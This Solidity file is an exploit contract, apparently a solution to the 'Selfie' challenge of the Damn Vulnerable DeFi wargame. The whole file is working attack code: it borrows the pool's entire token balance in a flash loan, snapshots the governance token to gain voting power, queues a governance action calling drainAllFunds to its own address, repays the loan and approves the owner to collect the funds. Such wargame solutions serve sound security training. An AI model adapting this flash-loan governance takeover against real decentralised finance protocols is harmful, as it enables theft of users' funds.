// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract Exploit {
    SimpleGovernance private gov;
    SelfiePool private pool;
    DamnValuableTokenSnapshot private dvts;
    address private owner;
    uint256 public actionId;

    constructor(SelfiePool _pool, DamnValuableTokenSnapshot _dvts) {
        owner = msg.sender;
        pool = _pool;
        dvts = _dvts;
        gov = _pool.governance();
    }

    function exploit() external {
        uint256 poolBalance = dvts.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
        dvts.approve(owner, poolBalance);
    }

    function receiveTokens(address _dvts, uint256 _amount) external {
        dvts.snapshot();
        bytes memory payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        actionId = gov.queueAction(address(pool), payload, 0);
        DamnValuableTokenSnapshot(_dvts).transfer(address(pool), _amount);
    }
}